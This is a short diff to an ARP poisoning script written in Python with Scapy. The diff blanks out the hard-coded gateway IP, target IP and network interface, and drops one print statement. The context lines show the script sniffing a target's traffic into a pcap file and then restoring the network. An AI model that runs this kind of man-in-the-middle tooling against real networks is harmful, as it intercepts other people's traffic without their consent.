@@ -14,10 +14,10 @@ import time
 # USAGE: sudo python2.7 arp_poison.py
 
 # Parameters
-gateway_ip = "10.41.254.254"
-target_ip = "10.41.176.177"
+gateway_ip = ""
+target_ip = ""
 packet_count = 1000
-conf.iface = "wlo1"
+conf.iface = ""
 conf.verb = 0
 
 # Get MAC address from ARP reply
@@ -81,7 +81,6 @@ try:
     print("[*] Starting network capture. Packet Count: %s. Filter: %s" % (packet_count, sniff_filter))
     packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
     wrpcap(target_ip + "_capture.pcap", packets)
-    print("[+] Packets : %s" % packets)
     print("[*] Stopping network capture.. Restoring network")
     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 
